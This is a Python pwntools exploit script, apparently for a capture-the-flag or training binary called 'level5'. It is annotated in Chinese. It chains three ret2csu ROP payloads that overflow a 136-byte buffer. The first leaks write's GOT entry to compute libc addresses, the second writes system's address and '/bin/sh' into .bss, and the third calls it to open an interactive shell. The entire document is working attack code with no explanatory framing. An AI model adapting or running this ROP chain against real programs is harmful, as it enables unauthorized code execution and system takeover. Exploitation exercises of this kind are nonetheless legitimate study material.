from pwn import *
from time import sleep

# 加载ELF文件
elf = ELF('level5')

# 启动进程
p = process('./level5')

# 获取write和read函数在GOT表中的地址
write_got = elf.got['write']
print("write_got: " + hex(write_got))

read_got = elf.got['read']
print("read_got: " + hex(read_got))

# 定义一些地址
main_addr = 0x400564
bss_addr = 0x601028

# 构造payload1，确保所有内容都是bytes类型
payload1 = b"\x00" * 136
payload1 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)
payload1 += p64(0x4005F0)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += b"a" * 56
payload1 += p64(main_addr)

# 发送payload1并接收响应
p.recvuntil(b"Hello, World\n")
print("\n#############sending payload1#############\n")
p.send(payload1)
sleep(1)

# 接收write函数的地址，确保接收的是bytes类型
write_addr_bytes = p.recv(8)
write_addr = u64(write_addr_bytes.ljust(8, b'\x00'))
print("write_addr: " + hex(write_addr))

# 定义libc中的函数地址
write_libc = 0x0f72b0
read_libc = 0x0f7250
system_libc = 0x045390
binsh_addr = 0x18cd57

# 计算偏移
offset = write_addr - write_libc
print("offset: " + hex(offset))

# 计算system函数的地址
system_addr = offset + system_libc
print("system_addr: " + hex(system_addr))

# 构造payload2，确保所有内容都是bytes类型
payload2 = b"a" * 136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr) + p64(16)
payload2 += p64(0x4005F0)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += b"a" * 56
payload2 += p64(main_addr)

# 发送payload2并接收响应
print("\n#############sending payload2#############\n")
p.send(payload2)
sleep(1)

# 发送system函数地址和"/bin/sh"字符串
p.send(p64(system_addr))
p.send(b"/bin/sh\x00")  # 确保发送的是bytes类型

# 接收响应
sleep(1)
p.recvuntil(b"Hello, World\n")

# 构造payload3，确保所有内容都是bytes类型
payload3 = b"\x00" * 136
payload3 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0) + p64(0)
payload3 += p64(0x4005F0)  # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += b"\x00" * 56
payload3 += p64(main_addr)

# 发送payload3
print("\n#############sending payload3#############\n")
sleep(1)
p.send(payload3)

# 进入交互模式
p.interactive()